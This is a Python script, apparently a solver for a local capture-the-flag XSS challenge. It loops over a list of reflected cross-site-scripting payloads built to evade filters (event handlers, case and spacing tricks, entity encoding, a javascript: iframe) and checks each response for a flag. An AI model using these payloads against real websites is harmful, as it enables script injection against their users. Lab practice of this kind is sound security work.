import requests
import re

base_url = "http://127.0.0.1:32827/page"

# Curated XSS payloads - most promising variations
payloads = [
    # Basic baseline
    "<script>alert('XSS')</script>",
    
    # Different tags with onload
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe onload=alert('XSS')>",
    
    # Different event handlers
    "<img src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<svg onanimationstart=alert('XSS')>",
    
    # Case variations
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<SvG OnLoAd=alert('XSS')>",
    "<IMG SRC=x ONERROR=alert('XSS')>",
    
    # Without quotes
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    
    # With backticks
    "<svg onload=alert(`XSS`)>",
    
    # Different spacing
    "<svg onload = alert('XSS')>",
    "<svg\tonload=alert('XSS')>",
    "<svg/onload = alert('XSS')>",
    
    # Self-closing variations
    "<svg/onload=alert('XSS')/>",
    "<img/src=x/onerror=alert('XSS')/>",
    
    # HTML encoding
    "<img src=x onerror=alert&#40;'XSS'&#41;>",
    "<svg onload=alert&#40;1&#41;>",
    
    # Complex structures
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS')>",
    
    # Protocol handlers
    "<iframe src=javascript:alert('XSS')>",
    
    # Mixed quotes
    '<svg onload="alert(\'XSS\')">',
    "<svg onload='alert(\"XSS\")'>",
]

print(f"Testing {len(payloads)} XSS payloads")

success_count = 0
filtered_count = 0
blocked_count = 0

for i, payload in enumerate(payloads, 1):
    try:
        params = {'name': payload}
        resp = requests.get(base_url, params=params, timeout=5)
        
        has_success = "success_star.png" in resp.text
        has_error = "error_star.png" in resp.text
        has_blocked = "new_star.png" in resp.text
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        
        if has_success or flag_match:
            print(f"\n[SUCCESS {i}] Payload: {payload}")
            print(f"Status: {resp.status_code} | Length: {len(resp.text)}B")
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group()}")
            print(f"Response:\n{resp.text}\n")
            success_count += 1
        elif has_error:
            filtered_count += 1
        elif has_blocked:
            blocked_count += 1
        else:
            print(f"\n[ANOMALY {i}] Payload: {payload}")
            print(f"Status: {resp.status_code} | Length: {len(resp.text)}B")
            print(f"No standard indicator found")
            print(f"Response preview: {resp.text[:200]}")
            
    except Exception as e:
        print(f"\n[ERROR {i}] Payload: {payload}")
        print(f"Exception: {str(e)}")

print(f"\n[SUMMARY]")
print(f"Total: {len(payloads)} | Success: {success_count} | Filtered: {filtered_count} | Blocked: {blocked_count}")

